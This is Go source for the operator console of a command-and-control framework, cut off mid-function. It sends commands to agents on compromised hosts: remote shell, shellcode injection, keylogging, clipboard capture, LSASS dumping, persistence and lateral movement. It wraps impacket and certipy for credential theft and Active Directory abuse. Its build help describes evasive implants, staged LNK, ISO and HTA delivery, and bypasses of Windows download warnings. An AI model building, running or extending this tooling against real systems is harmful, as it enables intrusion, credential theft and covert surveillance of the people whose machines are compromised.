package client

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
	"unicode/utf16"

	"github.com/chzyer/readline"
	"redteam/profile"
	"redteam/server"
)

var globalCmds = []string{
	"agents", "use", "build", "gencert",
	"jobs", "listener", "chat", "operators",
	"plugins",
	"setup", "scan", "enum", "spray", "asrep", "secretsdump", "bloodhound", "kerbrute",
	"expose",
	// impacket: execution
	"wmiexec", "psexec", "smbexec", "dcomexec", "atexec",
	// impacket: kerberos
	"kerberoast", "gettgt", "getst", "describeticket", "ticketconverter",
	// impacket: enumeration
	"lookupsid", "samrdump", "rpcdump", "getadusers", "getadcomputers",
	"finddelegation", "getlaps", "getgpp", "dumpntlminfo",
	// impacket: network/service
	"mssqlclient", "smbclient", "smbserver", "ntlmrelayx",
	// impacket: AD privilege escalation
	"dacledit", "rbcd", "addcomputer", "changepasswd", "dpapi",
	// impacket: generic passthrough
	"impacket",
	// certipy: ADCS enumeration and abuse
	"certipy",
	// credential vault
	"cred",
	// operator role management
	"role",
	// AI mode
	"ai",
	// reporting
	"report",
	// web GUI control
	"gui",
	"help", "exit", "quit",
}
var sessionCmds = []string{
	"info", "shell", "sleep", "download", "upload",
	"stage2", "bof", "results", "kill", "tasks-kill", "back",
	"pwd", "cd", "ls", "mkdir", "rm", "env", "cat",
	"ps", "screenshot", "inject", "token", "socks", "portfwd", "cleanup",
	"persist", "forkrun", "inject-apc", "dotnet-asm", "dotnet-exec",
	"keylog", "clip",
	"link", "rsocks", "httpivot", "winrm",
	"minidump", "port-scan",
}
var buildTransports = []string{"http", "mtls", "tcp", "dns"}
var listenerProtos = []string{"http", "mtls", "tcp", "wstunnel", "dns"}
var credSubcmds = []string{"list", "add", "del", "show", "import", "dump"}
var roleSubcmds = []string{"list", "set"}
var roleNames = []string{"admin", "operator", "viewer"}
var listenerSubcmds = []string{"start", "stop"}
var helpTopics = []string{"start"}
var guiSubcmds = []string{"start", "stop", "status"}
var pluginSubcmds = []string{"list", "reload", "run", "runs"}

type CLI struct {
	c         *Client
	rl        *readline.Instance
	current   string // active agent ID prefix
	operator  string // name of this operator
	lastMsgID atomic.Int64
	chatMode  atomic.Bool
}

func NewCLI(c *Client) *CLI {
	op := os.Getenv("USER")
	if op == "" {
		op = "operator"
	}
	return &CLI{c: c, operator: op}
}

const agentsUsage = `usage: agents [del <id>]

  No arguments → lists all registered agents.

  agents del <id>   delete agent and its tasks/results from the DB
                    (TAB completes IDs)

  Columns:
    ID        full agent UUID
    HOSTNAME  compromised host name
    USER      user the agent is running as
    IP        source IP address
    TRANSP    transport: http | mtls | smb
    STATUS    seconds/minutes since last beacon, or "disconnected"
`

func (cl *CLI) Run() {
	fmt.Print(cBGreen + `
  _ __ ___  __| | |_ ___  __ _ _ __ ___
 | '__/ _ \/ _' | __/ _ \/ _' | '_ ' _ \
 | | |  __/ (_| | ||  __/ (_| | | | | | |
 |_|  \___|\__,_|\__\___|\__,_|_| |_| |_|
` + cReset + cBCyan + `  c2` + cReset + cDim + `  —  type 'help' for commands` + cReset + "\n")

	// Inicializar lastMsgID con el ID actual para no mostrar mensajes viejos
	if raw, err := cl.c.ChatSince(0); err == nil {
		var msgs []*server.ChatMessage
		if json.Unmarshal(raw, &msgs) == nil && len(msgs) > 0 {
			cl.lastMsgID.Store(msgs[len(msgs)-1].ID)
		}
	}
	go cl.chatPoller()
	go cl.agentMonitor()
	go cl.serverMonitor()

	rl, err := readline.NewEx(&readline.Config{
		Prompt:          "c2> ",
		HistoryFile:     filepath.Join(profile.DefaultDir(), ".history"),
		AutoComplete:    readline.NewPrefixCompleter(readline.PcItemDynamic(cl.complete)),
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		fmt.Println("readline error:", err)
		return
	}
	defer rl.Close()
	cl.rl = rl

	for {
		cl.updatePrompt()
		line, err := rl.Readline()
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// ! prefix → ejecutar comando local directamente
		if strings.HasPrefix(line, "!") {
			rest := strings.TrimSpace(line[1:])
			if rest == "" {
				fmt.Println("usage: !<command>  e.g.: !whoami")
			} else {
				cl.runLocalShell(rest)
			}
			continue
		}
		parts := strings.Fields(line)
		cl.dispatch(parts)
	}
}

func (cl *CLI) dispatch(parts []string) {
	// Log local commands for the activity report
	cl.logCmd(parts)

	switch parts[0] {
	case "help":
		if len(parts) >= 2 && parts[1] == "start" {
			printQuickstart()
		} else {
			printHelp()
		}

	case "agents":
		if len(parts) >= 2 && (parts[1] == "-h" || parts[1] == "--help" || parts[1] == "help") {
			fmt.Print(agentsUsage)
			return
		}
		if len(parts) >= 2 && parts[1] == "del" {
			if len(parts) < 3 {
				warn("usage: agents del <agent_id>  [TAB completes IDs]")
				return
			}
			if err := cl.c.DeleteAgent(parts[2]); err != nil {
				errLine("%s", err)
				return
			}
			ok("agent %s%s%s deleted", cBYellow, parts[2], cReset)
			if cl.current != "" && strings.HasPrefix(cl.current, parts[2]) {
				cl.current = ""
			}
			return
		}
		cl.cmdAgents()

	case "use":
		if len(parts) < 2 {
			warn("usage: use <agent_id>")
			return
		}
		cl.current = parts[1]
		// Validate by fetching info
		if _, err := cl.c.AgentInfo(cl.current); err != nil {
			errLine("agent not found: %s", err)
			cl.current = ""
		}

	case "back":
		cl.current = ""

	case "info":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdInfo(cl.current)

	case "shell":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 2 {
			warn("usage: shell <command>")
			return
		}
		cl.cmdTask(cl.current, "SHELL", strings.Join(parts[1:], " "), nil)

	case "sleep":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 3 {
			warn("usage: sleep <sec> <jitter_pct>")
			return
		}
		secVal, errS := strconv.Atoi(parts[1])
		jitterVal, errJ := strconv.Atoi(parts[2])
		if errS != nil || errJ != nil || secVal < 0 || jitterVal < 0 || jitterVal > 100 {
			warn("sleep: sec and jitter must be non-negative integers (jitter 0-100)")
			return
		}
		argBytes, _ := json.Marshal(map[string]int{"sec": secVal, "jitter": jitterVal})
		args := string(argBytes)
		cl.cmdTask(cl.current, "SLEEP", args, nil)

	case "download":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 2 {
			warn("usage: download <remote_path>")
			return
		}
		cl.cmdTask(cl.current, "DOWNLOAD", fmt.Sprintf(`{"path":%q}`, parts[1]), nil)

	case "upload":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 3 {
			warn("usage: upload <local_file> <remote_path>")
			return
		}
		data, err := os.ReadFile(parts[1])
		if err != nil {
			errLine("reading file: %s", err)
			return
		}
		args := fmt.Sprintf(`{"filename":%q,"remote_path":%q}`, filepath.Base(parts[1]), parts[2])
		cl.cmdTask(cl.current, "UPLOAD", args, data)

	case "stage2":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 2 {
			warn("usage: stage2 <shellcode.bin>")
			return
		}
		sc, err := os.ReadFile(parts[1])
		if err != nil {
			errLine("reading shellcode: %s", err)
			return
		}
		cl.cmdTask(cl.current, "STAGE2", "", sc)

	case "bof":
		if len(parts) > 1 && parts[1] == "install" {
			cl.cmdBofInstall()
			return
		}
		if len(parts) < 2 || parts[1] == "list" {
			cl.cmdBofList()
			return
		}
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdBOF(parts[1:])

	case "pwd":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdTask(cl.current, "PWD", "", nil)

	case "cd":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		path := ""
		if len(parts) >= 2 {
			path = strings.Join(parts[1:], " ")
		}
		cl.cmdTask(cl.current, "CD", path, nil)

	case "ls":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		path := ""
		if len(parts) >= 2 {
			path = strings.Join(parts[1:], " ")
		}
		cl.cmdTask(cl.current, "LS", path, nil)

	case "mkdir":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 2 {
			warn("usage: mkdir <path>")
			return
		}
		cl.cmdTask(cl.current, "MKDIR", strings.Join(parts[1:], " "), nil)

	case "rm":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 2 {
			warn("usage: rm <path>")
			return
		}
		cl.cmdTask(cl.current, "RM", strings.Join(parts[1:], " "), nil)

	case "env":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdTask(cl.current, "ENV", "", nil)

	case "cat":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 2 {
			warn("usage: cat <path>")
			return
		}
		cl.cmdTask(cl.current, "CAT", strings.Join(parts[1:], " "), nil)

	case "ps":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdTask(cl.current, "PS", "", nil)

	case "screenshot":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdTask(cl.current, "SCREENSHOT", "", nil)

	case "inject":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		if len(parts) < 3 {
			warn("usage: inject <pid> <shellcode.bin>")
			return
		}
		sc, err := os.ReadFile(parts[2])
		if err != nil {
			errLine("%s", err)
			return
		}
		cl.cmdTask(cl.current, "INJECT_REMOTE", parts[1], sc)

	case "token":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdToken(parts[1:])

	case "socks":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdSocks(parts[1:])

	case "portfwd":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		cl.cmdPortFwd(parts[1:])

	case "cleanup":
		if cl.requireAgent(); cl.current == "" {
			return
		}
		fmt.Print(pfxWarn + "this will delete the agent record — confirm [y/N]: ")
		var confirm string
		fmt.Scanln(&confirm)
		if strings.ToLower(confirm) == "y" {
			cl.cmdTask(cl.current, "CLEANUP", "", nil)
			cl.current = ""
		}

	case "kill":
		target := cl.current
		if len(parts) >= 2 {
			target = parts[1]
		}
		if target == "" {
			warn("no agent specified")
			return
		}
		if err := cl.c.KillAgent(target); err != nil {
			errLine("%s", err)
			return
		}
		ok("kill sent to %s%s%s", cBYellow, target[:8], cReset)
		if target == cl.current {
			cl.current = ""
		}

	case "tasks-kill":
		if len(parts) < 2 {
			warn("usage: tasks-kill <task_id>")
			return
		}
		target := cl.current
		if target == "" {
			warn("no agent selected (use: use <agent>)")
			return
		}
		taskID, err := strconv.ParseInt(parts[1], 10, 64)
		if err != nil {
			warn("invalid task id: %s", parts[1])
			return
		}
		if err := cl.c.CancelTask(target, taskID); err != nil {
			errLine("%s", err)
			return
		}
		ok("task #%s%d%s cancelled", cBYellow, taskID, cReset)

	case "results":
		target := cl.current
		if len(parts) >= 2 && cl.current == "" {
			target = parts[1]
		}
		if target == "" {
			warn("no agent specified")
			return
		}
		limit := 20
		if len(parts) >= 3 {
			limit, _ = strconv.Atoi(parts[2])
		}
		cl.cmdResults(target, limit)

	case "jobs":
		cl.cmdJobs()

	case "plugins":
		cl.cmdPlugins(parts[1:])

	case "listener":
		cl.cmdListener(parts[1:])

	case "build":
		cl.cmdBuild(parts[1:])

	case "gencert":
		if len(parts) < 2 {
			warn("usage: gencert <label>")
			return
		}
		resp, err := cl.c.GenCert(parts[1])
		if err != nil {
			errLine("%s", err)
			return
		}
		outCert := parts[1] + "-agent.crt"
		outKey := parts[1] + "-agent.key"
		os.WriteFile(outCert, []byte(resp["cert_pem"]), 0600)
		os.WriteFile(outKey, []byte(resp["key_pem"]), 0600)
		ok("cert: %s%s%s", cBCyan, outCert, cReset)
		ok("key:  %s%s%s", cBCyan, outKey, cReset)

	case "chat":
		cl.cmdChat()

	case "operators":
		cl.cmdOperators()

	case "expose":
		cl.cmdExpose(parts[1:])

	// ── comandos locales del atacante ─────────────────────────────────────────
	case "setup":
		cl.cmdSetup()
	case "scan":
		cl.cmdScan(parts[1:])
	case "enum":
		cl.cmdEnum(parts[1:])
	case "spray":
		cl.cmdSpray(parts[1:])
	case "asrep":
		cl.cmdASREP(parts[1:])
	case "secretsdump":
		cl.cmdSecretsDump(parts[1:])
	case "bloodhound":
		cl.cmdBloodHound(parts[1:])
	case "kerbrute":
		cl.cmdKerbrute(parts[1:])

	// ── impacket: ejecución ───────────────────────────────────────────────────
	case "wmiexec":
		cl.cmdWmiexec(parts[1:])
	case "psexec":
		cl.cmdPsexec(parts[1:])
	case "smbexec":
		cl.cmdSmbexec(parts[1:])
	case "dcomexec":
		cl.cmdDcomexec(parts[1:])
	case "atexec":
		cl.cmdAtexec(parts[1:])

	// ── impacket: kerberos ────────────────────────────────────────────────────
	case "kerberoast":
		cl.cmdKerberoast(parts[1:])
	case "gettgt":
		cl.cmdGetTGT(parts[1:])
	case "getst":
		cl.cmdGetST(parts[1:])
	case "describeticket":
		cl.cmdDescribeTicket(parts[1:])
	case "ticketconverter":
		cl.cmdTicketConverter(parts[1:])

	// ── impacket: enumeración ─────────────────────────────────────────────────
	case "lookupsid":
		cl.cmdLookupSID(parts[1:])
	case "samrdump":
		cl.cmdSamrdump(parts[1:])
	case "rpcdump":
		cl.cmdRPCDump(parts[1:])
	case "getadusers":
		cl.cmdGetADUsers(parts[1:])
	case "getadcomputers":
		cl.cmdGetADComputers(parts[1:])
	case "finddelegation":
		cl.cmdFindDelegation(parts[1:])
	case "getlaps":
		cl.cmdGetLAPS(parts[1:])
	case "getgpp":
		cl.cmdGetGPP(parts[1:])
	case "dumpntlminfo":
		cl.cmdDumpNTLMInfo(parts[1:])

	// ── impacket: red/servicio ────────────────────────────────────────────────
	case "mssqlclient":
		cl.cmdMssqlclient(parts[1:])
	case "smbclient":
		cl.cmdSmbclient(parts[1:])
	case "smbserver":
		cl.cmdSmbserver(parts[1:])
	case "ntlmrelayx":
		cl.cmdNtlmrelayx(parts[1:])

	// ── impacket: AD/DACL/privesc ─────────────────────────────────────────────
	case "dacledit":
		cl.cmdDacledit(parts[1:])
	case "rbcd":
		cl.cmdRBCD(parts[1:])
	case "addcomputer":
		cl.cmdAddComputer(parts[1:])
	case "changepasswd":
		cl.cmdChangePasswd(parts[1:])
	case "dpapi":
		cl.cmdDpapi(parts[1:])

	// ── certipy (ADCS) ───────────────────────────────────────────────────────
	case "certipy":
		cl.cmdCertipy(parts[1:])

	// ── credential vault ──────────────────────────────────────────────────────
	case "cred":
		cl.cmdCred(parts[1:])

	// ── operator roles ────────────────────────────────────────────────────────
	case "role":
		cl.cmdRole(parts[1:])

	// ── persistence (agente activo) ───────────────────────────────────────────
	case "persist":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdPersist(parts[1:])

	// ── fork & run (agente activo) ────────────────────────────────────────────
	case "forkrun":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdForkRun(parts[1:])

	// ── APC early-bird injection ──────────────────────────────────────────────
	case "inject-apc":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdInjectAPC(parts[1:])

	// ── execute .NET assembly in memory ──────────────────────────────────────
	case "dotnet-asm":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdExecAsm(parts[1:])

	// ── inline .NET execution (native CLR host, in-process) ──────────────────
	case "dotnet-exec":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdExecDotnet(parts[1:])

	// ── keylogger ─────────────────────────────────────────────────────────────
	case "keylog":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdKeylog(parts[1:])

	// ── clipboard ─────────────────────────────────────────────────────────────
	case "clip":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdClip()

	// ── SMB named pipe pivot server ───────────────────────────────────────────
	case "link":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdLink(parts[1:])

	// ── Reverse SOCKS5 ───────────────────────────────────────────────────────
	case "rsocks":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdRSocks(parts[1:])

	// ── HTTP pivot server ─────────────────────────────────────────────────────
	case "httpivot":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdHTTPivot(parts[1:])

	// ── WinRM lateral movement ────────────────────────────────────────────────
	case "winrm":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdWinRM(parts[1:])

	// ── LSASS minidump ────────────────────────────────────────────────────────
	case "minidump":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdMinidump(parts[1:])

	// ── Port scan ─────────────────────────────────────────────────────────────
	case "port-scan":
		cl.requireAgent()
		if cl.current == "" {
			return
		}
		cl.cmdPortScan(parts[1:])

	// ── AI ────────────────────────────────────────────────────────────────────
	case "ai":
		cl.cmdAI(parts[1:])

	// ── impacket: passthrough genérico ────────────────────────────────────────
	case "impacket":
		cl.cmdImpacket(parts[1:])

	// ── reporting ─────────────────────────────────────────────────────────────
	case "report":
		cl.cmdReport(parts[1:])

	// ── web GUI control ───────────────────────────────────────────────────────
	case "gui":
		cl.cmdGUI(parts[1:])

	case "exit", "quit":
		fmt.Println(cDim + "bye" + cReset)
		os.Exit(0)

	default:
		warn("unknown command: %s%s%s  (type 'help')", cBCyan, parts[0], cReset)
	}
}

// ── command implementations ───────────────────────────────────────────────

func (cl *CLI) cmdAgents() {
	raw, err := cl.c.Agents()
	if err != nil {
		errLine("%s", err)
		return
	}
	var agents []*server.Agent
	if err := json.Unmarshal(raw, &agents); err != nil {
		errLine("parse: %s", err)
		return
	}
	if len(agents) == 0 {
		info("no agents connected")
		return
	}
	fmt.Printf(cBold+"%-36s  %-15s  %-20s  %-15s  %-8s  %s\n"+cReset,
		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "STATUS")
	fmt.Println(cDim + strings.Repeat("─", 110) + cReset)
	for _, a := range agents {
		var status string
		if !a.Active {
			status = cBRed + "dead" + cReset
		} else if server.IsStale(a) {
			status = cBYellow + "disconnected" + cReset
		} else {
			status = cBGreen + ago(a.LastSeen) + cReset
		}
		fmt.Printf("%-36s  %-15s  %-20s  %-15s  %-8s  %s\n",
			a.ID, a.Hostname, a.Username, a.IP, a.Transport, status)
	}
}

func (cl *CLI) cmdInfo(id string) {
	raw, err := cl.c.AgentInfo(id)
	if err != nil {
		errLine("%s", err)
		return
	}
	var a server.Agent
	json.Unmarshal(raw, &a)
	kv := func(k, v string) string {
		return cBCyan + fmt.Sprintf("%-10s", k) + cReset + " " + v + "\n"
	}
	fmt.Print(
		kv("ID", a.ID),
		kv("Hostname", a.Hostname),
		kv("User", a.Username),
		kv("OS", a.OS),
		kv("IP", a.IP),
		kv("PID", fmt.Sprintf("%d", a.PID)),
		kv("Transport", a.Transport),
		kv("Sleep", fmt.Sprintf("%ds ±%d%%", a.SleepSec, a.JitterPct)),
		kv("Last seen", a.LastSeen.Format(time.RFC3339)),
	)
}

func (cl *CLI) cmdTask(agentID, taskType, args string, payload []byte) {
	tid, err := cl.c.QueueTask(agentID, taskType, args, payload)
	if err != nil {
		errLine("%s", err)
		return
	}
	info("task #%s%d%s queued — waiting for agent...", cBYellow, tid, cReset)
	r, err := cl.c.WaitResult(agentID, tid, 5*time.Minute)
	if err != nil {
		warn("%s", err)
		return
	}
	if r.Output != "" {
		fmt.Print(r.Output)
		if len(r.Output) > 0 && r.Output[len(r.Output)-1] != '\n' {
			fmt.Println()
		}
	}
	if r.Error != "" {
		errLine("%s", r.Error)
	}
}

func (cl *CLI) cmdResults(agentID string, limit int) {
	raw, err := cl.c.Results(agentID, limit)
	if err != nil {
		errLine("%s", err)
		return
	}
	var results []*server.Result
	json.Unmarshal(raw, &results)
	if len(results) == 0 {
		info("no results")
		return
	}
	for _, r := range results {
		fmt.Printf(cDim+"─── task #%d @ %s ───"+cReset+"\n", r.TaskID, r.CreatedAt.Format("15:04:05"))
		if r.Output != "" {
			fmt.Println(r.Output)
		}
		if r.Error != "" {
			errLine("%s", r.Error)
		}
	}
}

func (cl *CLI) cmdJobs() {
	raw, err := cl.c.Jobs()
	if err != nil {
		errLine("%s", err)
		return
	}
	var jobs []*server.Job
	json.Unmarshal(raw, &jobs)
	if len(jobs) == 0 {
		info("no listeners running")
		return
	}
	fmt.Printf(cBold+"%-4s  %-10s  %-6s  %-12s  %s\n"+cReset, "ID", "PROTO", "PORT", "STATUS", "UPTIME")
	fmt.Println(cDim + strings.Repeat("─", 50) + cReset)
	for _, j := range jobs {
		uptime := time.Since(j.StartedAt).Round(time.Second).String()
		var status string
		if j.Status == "running" {
			status = cBGreen + "running" + cReset
		} else {
			status = cBRed + "stopped" + cReset
		}
		fmt.Printf("%-4d  %-10s  %-6d  %-22s  %s\n", j.ID, j.Protocol, j.Port, status, uptime)
	}
}

func (cl *CLI) cmdPlugins(args []string) {
	if len(args) == 0 || args[0] == "list" {
		if len(args) > 1 {
			warn("usage: plugins list")
			return
		}
		raw, err := cl.c.ListPlugins()
		if err != nil {
			errLine("%s", err)
			return
		}
		fmt.Println(string(raw))
		return
	}
	if args[0] == "reload" {
		if len(args) > 1 {
			warn("usage: plugins reload")
			return
		}
		raw, err := cl.c.ReloadPlugins()
		if err != nil {
			errLine("%s", err)
			return
		}
		fmt.Println(string(raw))
		return
	}
	if args[0] == "runs" {
		if len(args) < 2 {
			warn("usage: plugins runs <module_id> [limit]")
			return
		}
		limit := 20
		if len(args) >= 3 {
			parsed, err := strconv.Atoi(args[2])
			if err != nil || parsed <= 0 {
				warn("plugin run limit must be a positive integer")
				return
			}
			limit = parsed
		}
		if len(args) > 3 {
			warn("usage: plugins runs <module_id> [limit]")
			return
		}
		raw, err := cl.c.PluginRuns(args[1], limit)
		if err != nil {
			errLine("%s", err)
			return
		}
		fmt.Println(string(raw))
		return
	}
	if args[0] == "run" {
		if len(args) < 2 {
			warn("usage: plugins run <module_id> [json_input]")
			return
		}
		if len(args) > 3 {
			warn("plugin input must be one JSON argument")
			return
		}
		input := json.RawMessage(`{}`)
		if len(args) >= 3 {
			input = json.RawMessage(strings.Join(args[2:], " "))
			if !json.Valid(input) {
				warn("plugin input must be valid JSON")
				return
			}
		}
		raw, err := cl.c.RunPlugin(args[1], input)
		if err != nil {
			errLine("%s", err)
			return
		}
		fmt.Println(string(raw))
		return
	}
	warn("usage: plugins list|reload|run <module_id> [json_input]|runs <module_id> [limit]")
}

func (cl *CLI) cmdListener(args []string) {
	if len(args) < 1 {
		warn("usage: listener start http|mtls|tcp|wstunnel|dns <port> [domain]\n       listener stop <id>")
		return
	}
	switch args[0] {
	case "start":
		if len(args) < 3 {
			warn("usage: listener start http|mtls|tcp|wstunnel|dns <port> [domain]")
			return
		}
		port, err := strconv.Atoi(args[2])
		if err != nil {
			errLine("invalid port")
			return
		}
		proto := strings.ToLower(args[1])
		if proto == "dns" {
			domain := ""
			if len(args) >= 4 {
				domain = args[3]
			} else {
				warn("usage: listener start dns <port> <c2domain>")
				return
			}
			id, err := cl.c.StartDNSListener(domain, port)
			if err != nil {
				errLine("%s", err)
				return
			}
			ok("DNS listener on %s:%d%s  domain=%s%s%s  (job #%s%d%s)",
				cBGreen, port, cReset, cBCyan, domain, cReset, cBYellow, id, cReset)
			return
		}
		id, err := cl.c.StartListener(proto, port)
		if err != nil {
			errLine("%s", err)
			return
		}
		ok("%s%s%s listener on %s:%d%s  (job #%s%d%s)",
			cBGreen, strings.ToUpper(proto), cReset, cBGreen, port, cReset, cBYellow, id, cReset)

	case "stop":
		if len(args) < 2 {
			warn("usage: listener stop <id>")
			return
		}
		id, err := strconv.Atoi(args[1])
		if err != nil {
			errLine("invalid id")
			return
		}
		if err := cl.c.StopListener(id); err != nil {
			errLine("%s", err)
			return
		}
		ok("job #%s%d%s stopped", cBYellow, id, cReset)

	default:
		warn("usage: listener start|stop ...")
	}
}

func (cl *CLI) cmdBuild(args []string) {
	if len(args) < 2 {
		fmt.Print(`usage: build http|mtls|tcp <host> [sleep] [jitter] [options]
  tcp uses port 4444 by default (override with port=<N>)

options (key=value or bare flag):
  arch=x86|arm64        target arch          (default: x64)
  os=linux              build Linux ELF      (default: windows)
  format=dll|html|lnk|iso|hta  output format (default: exe)
  inject=fiber|callback|ntthread  inject method
  encrypt=xor|aes|poly  encrypt shellcode (poly = polymorphic SGN stub, no C loader needed)
  kill-date=YYYY-MM-DD  agent self-destructs after date
  garble                obfuscate with garble
  sandbox               embed sandbox/VM detection
  stage-url=<url>       base URL for staged delivery (required for lnk/iso/hta)
                        e.g. cloudflared tunnel: https://abc.trycloudflare.com
  user-agent=<str>      custom User-Agent string
  beacon-uris=<paths>   comma-separated beacon paths (e.g. /search,/api/v1/data)
  http-headers=<hdrs>   extra headers (e.g. X-Cache-ID:abc;Cookie:session=xyz)
  proxy=<url>           HTTP proxy (e.g. http://proxy:8080)
  working-hours=<range> active time window (e.g. 09:00-17:00)
  smb-pipe=<name>       named pipe for SMB transport
  name=<str>            output filename (without extension)

Staged delivery formats (evade MOTW, shellcode loads in-memory):
  lnk   Windows shortcut → PowerShell fetches .bin from stage-url and injects in memory
  iso   ISO image with LNK inside → mounts on double-click, bypasses SmartScreen/MOTW
  hta   HTML Application → VBScript runs PowerShell shellcode loader via mshta.exe

examples:
  build http 10.0.0.1
  build mtls 10.0.0.1 60 20 garble sandbox inject=fiber
  build http 10.0.0.1 30 10 format=html
  build mtls 10.0.0.1 60 20 encrypt=aes kill-date=2026-12-31
  build http 10.0.0.1 60 20 os=linux arch=arm64
  build http 10.0.0.1 60 20 format=dll inject=callback
  build http 10.0.0.1 60 20 format=iso stage-url=https://abc.trycloudflare.com
  build http 10.0.0.1 60 20 format=lnk stage-url=https://abc.trycloudflare.com
  build http 10.0.0.1 60 20 format=hta stage-url=https://abc.trycloudflare.com
  build http 10.0.0.1 60 20 user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" beacon-uris=/search,/api/v1/data
  build http 10.0.0.1 60 20 proxy=http://proxy:8080 working-hours=09:00-17:00
  build tcp 10.0.0.1                          (TCP raw socket, port 4444)
  build tcp 10.0.0.1 60 20 port=9000          (TCP raw socket, custom port)
`)
		return
	}
	transport, host := args[0], args[1]
	sleepSec, jitter := 60, 20
	if len(args) >= 3 {
		if v, err := strconv.Atoi(args[2]); err == nil {
			sleepSec = v
		}
	}
	if len(args) >= 4 {
		if v, err := strconv.Atoi(args[3]); err == nil {
			jitter = v
		}
	}
	port := "8080"
	scheme := "http"
	switch transport {
	case "mtls":
		port, scheme = "8443", "https"
	case "tcp":
		port, scheme = "4444", "tcp"
	}
	cfg := map[string]any{
		"server_url": fmt.Sprintf("%s://%s:%s", scheme, host, port),
		"transport":  transport,
		"sleep_sec":  sleepSec,
		"jitter_pct": jitter,
	}

	// Parse extra key=value options after positional args
	start := 4
	if len(args) >= 3 {
		if _, err := strconv.Atoi(args[2]); err != nil {
			start = 2 // args[2] is not a number → options start here
		}
	}
	for i := start; i < len(args); i++ {
		arg := args[i]
		if strings.Contains(arg, "=") {
			kv := strings.SplitN(arg, "=", 2)
			k, v := kv[0], kv[1]
			switch k {
			case "arch":
				cfg["arch"] = v
			case "os", "goos":
				cfg["goos"] = v
			case "format":
				cfg["format"] = v
			case "inject":
				cfg["inject_method"] = v
			case "kill-date":
				cfg["kill_date"] = v
			case "encrypt":
				cfg["encrypt"] = v
			case "sandbox":
				cfg["sandbox_checks"] = v == "true"
			case "garble":
				cfg["garble"] = v == "true"
			case "cover-traffic":
				cfg["cover_traffic"] = v == "true"
			case "user-agent":
				cfg["user_agent"] = v
			case "beacon-uris":
				cfg["beacon_uris"] = v
			case "http-headers":
				cfg["http_headers"] = v
			case "proxy":
				cfg["proxy_url"] = v
			case "working-hours":
				cfg["working_hours"] = v
			case "smb-pipe":
				cfg["smb_pipe"] = v
			case "dns-server":
				cfg["dns_server"] = v
			case "dns-domain":
				cfg["dns_domain"] = v
			case "stage-url":
				cfg["stage_url"] = v
			case "port":
				cfg["server_url"] = fmt.Sprintf("%s://%s:%s", scheme, host, v)
			case "name", "output-name", "out":
				cfg["output_name"] = v
			}
		} else {
			switch arg {
			case "garble":
				cfg["garble"] = true
			case "sandbox":
				cfg["sandbox_checks"] = true
			case "cover-traffic":
				cfg["cover_traffic"] = true
			}
		}
	}

	// Build summary line
	goos, _ := cfg["goos"].(string)
	if goos == "" {
		goos = "windows"
	}
	arch, _ := cfg["arch"].(string)
	if arch == "" {
		arch = "x64"
	}
	format, _ := cfg["format"].(string)
	if format == "" {
		format = "exe"
	}
	tags := fmt.Sprintf("os=%s arch=%s fmt=%s", goos, arch, format)
	if cfg["garble"] == true {
		tags += " garble"
	}
	if cfg["sandbox_checks"] == true {
		tags += " sandbox"
	}
	if cfg["cover_traffic"] == true {
		tags += " cover-traffic"
	}
	if kd, _ := cfg["kill_date"].(string); kd != "" {
		tags += " kill=" + kd
	}
	if enc, _ := cfg["encrypt"].(string); enc != "" {
		tags += " encrypt=" + enc
	}
	if inj, _ := cfg["inject_method"].(string); inj != "" {
		tags += " inject=" + inj
	}
	if ua, _ := cfg["user_agent"].(string); ua != "" {
		tags += " ua=custom"
	}
	if uris, _ := cfg["beacon_uris"].(string); uris != "" {
		tags += " beacon-uris=" + uris
	}
	if proxy, _ := cfg["proxy_url"].(string); proxy != "" {
		tags += " proxy=" + proxy
	}
	if wh, _ := cfg["working_hours"].(string); wh != "" {
		tags += " hours=" + wh
	}
	if pipe, _ := cfg["smb_pipe"].(string); pipe != "" {
		tags += " smb-pipe=" + pipe
	}
	info("building (%s%s%s → %s%s://%s:%s%s) [%s%s%s]...",
		cBYellow, transport, cReset, cBCyan, scheme, host, port, cReset, cDim, tags, cReset)

	resp, err := cl.c.Build(cfg)
	if err != nil {
		errLine("%s", err)
